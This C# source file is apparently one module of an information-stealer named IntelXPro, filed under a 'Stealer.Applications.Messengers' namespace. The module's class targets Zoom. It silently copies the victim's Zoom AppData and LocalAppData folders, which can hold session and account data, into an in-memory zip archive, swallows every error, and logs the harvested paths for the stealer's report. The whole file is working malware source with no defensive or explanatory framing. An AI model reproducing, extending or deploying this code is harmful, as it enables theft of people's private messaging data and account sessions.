using IntelXPro.src.IntelXPro.Dependencies.Data;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace IntelXPro.src.IntelXPro.Stealer.Applications.Messengers
{
    internal class Zoom : ITarget
    {
        public void Collect(InMemoryZip zip, Counter counter)
        {
            Counter.CounterApplications counterApplications = new Counter.CounterApplications();
            counterApplications.Name = "Zoom";
            int fileCount = 0;

            string zoomAppData = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Zoom");
            if (Directory.Exists(zoomAppData))
            {
                try
                {
                    string targetPath = "Zoom\\AppData";
                    zip.AddDirectoryFiles(zoomAppData, targetPath);
                    counterApplications.Files.Add(zoomAppData + " => " + targetPath);
                    fileCount++;
                }
                catch
                {
                }
            }

            string zoomLocal = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Zoom");
            if (Directory.Exists(zoomLocal))
            {
                try
                {
                    string targetPath = "Zoom\\LocalAppData";
                    zip.AddDirectoryFiles(zoomLocal, targetPath);
                    counterApplications.Files.Add(zoomLocal + " => " + targetPath);
                    fileCount++;
                }
                catch
                {
                }
            }

            if (fileCount > 0)
            {
                counterApplications.Files.Add("Zoom\\");
                counter.Messangers.Add(counterApplications);
            }
        }
    }
}
